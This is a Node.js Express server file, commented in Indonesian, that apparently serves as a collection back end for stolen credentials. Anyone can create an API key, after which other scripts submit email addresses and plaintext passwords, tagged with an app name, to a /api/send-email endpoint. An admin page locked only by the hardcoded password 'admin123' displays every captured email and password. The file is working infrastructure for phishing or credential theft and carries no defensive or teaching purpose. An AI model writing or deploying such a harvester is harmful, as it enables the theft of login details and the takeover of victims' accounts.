const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Variable global untuk nampung data di RAM Server
// Note: Data akan hilang jika server Vercel "Cold Start" (tidak ada traffic lama)
let database_api = {
    keys: ["admin", "beckk001"], // Default Key
    logs: []
};

// 1. DASHBOARD STATUS
app.get('/', (req, res) => {
    res.send(`
        <body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#111; color:#fff;">
            <h1>Base Penampung Serverless Active</h1>
            <p>Total Data Masuk: ${database_api.logs.length}</p>
            <p>Gunakan /api/view-all?pw=admin123 untuk login</p>
        </body>
    `);
});

// 2. CREATE API KEY (Bisa buat sepuasnya)
app.get('/api/create-key', (req, res) => {
    const { name } = req.query;
    if (!name) return res.json({ status: false, msg: "Nama key wajib ada" });
    
    if (!database_api.keys.includes(name)) {
        database_api.keys.push(name);
    }
    res.json({ 
        status: true, 
        apikey: name, 
        msg: "Key Berhasil Dibuat",
        endpoint: `https://${req.get('host')}/api/send-email`
    });
});

// 3. ENDPOINT PENAMPUNG (UNTUK DIKAITIN KE SC LAIN)
app.post('/api/send-email', (req, res) => {
    const { apikey, email, password, app_name } = req.body;

    // Cek API KEY
    if (!database_api.keys.includes(apikey)) {
        return res.status(403).json({ status: false, msg: "API Key Salah!" });
    }

    const dataBaru = {
        id: database_api.logs.length + 1,
        sender: apikey,
        app: app_name || "Unknown App",
        email: email,
        password: password,
        waktu: new Date().toLocaleString('id-ID')
    };

    database_api.logs.unshift(dataBaru); // Data terbaru di paling atas
    res.json({ status: true, msg: "Data Berhasil Masuk!" });
});

// 4. VIEW ALL DATA (DASHBOARD ADMIN)
app.get('/api/view-all', (req, res) => {
    const { pw } = req.query;
    if (pw !== 'admin123') return res.status(401).send("Akses Ditolak!");

    let rows = database_api.logs.map(d => `
        <tr style="border-bottom: 1px solid #333;">
            <td style="padding:10px">${d.waktu}</td>
            <td style="padding:10px; color:cyan;">${d.sender}</td>
            <td style="padding:10px">${d.app}</td>
            <td style="padding:10px; color:yellow;">${d.email}</td>
            <td style="padding:10px; color:red;">${d.password}</td>
        </tr>
    `).join('');

    res.send(`
        <body style="background:#000; color:#fff; font-family:sans-serif; padding:20px;">
            <h2>Master Penampung - Data Logs</h2>
            <p>Total Sender Aktif: ${database_api.keys.length}</p>
            <table border="1" style="width:100%; border-collapse:collapse;">
                <tr style="background:#222;">
                    <th>Waktu</th><th>Sender Key</th><th>Nama App</th><th>Email</th><th>Password</th>
                </tr>
                ${rows}
            </table>
        </body>
    `);
});

module.exports = app;